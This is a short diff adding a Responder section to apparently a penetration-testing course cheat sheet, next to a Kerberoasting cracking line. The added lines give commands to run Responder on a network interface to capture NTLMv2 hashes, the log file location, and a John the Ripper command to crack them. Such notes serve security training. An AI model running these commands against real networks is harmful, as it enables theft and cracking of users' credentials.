@@ -39,3 +39,14 @@ python tgsrepcrack.py example.dict C:\Users\sec560\Desktop\1-40a10000-john.doe@s
 
 ## Responder
 
+`Responder.py -I eth0`
+
+saved hashes will be put in /opt/responder/logs or whereever responder is stored
+
+`SMBv2-NTLMv2-SSP-YOUR_WINDOWS_IP_ADDRESS.txt`
+
+```
+john --format=netntlmv2 /opt/responder/logs/SMBv2-NTLMv2-SSP-YOUR_WINDOWS_IP_ADDRESS.txt
+```
+
+passwords saved in ~/.john/john.pot
